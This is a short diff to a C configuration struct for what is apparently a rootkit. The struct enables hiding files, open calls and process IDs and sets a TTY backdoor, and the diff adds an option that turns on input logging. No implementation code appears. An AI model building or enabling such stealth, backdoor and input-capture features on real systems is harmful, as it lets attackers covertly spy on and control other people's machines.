@@ -44,6 +44,7 @@ rootkit_t rootkit = {
     .hiding_files  = true,
     .hiding_open   = true,
     .hiding_pids   = true,
+    .logging_input = true,
     .backdoor = BD_TTY,
 };
 
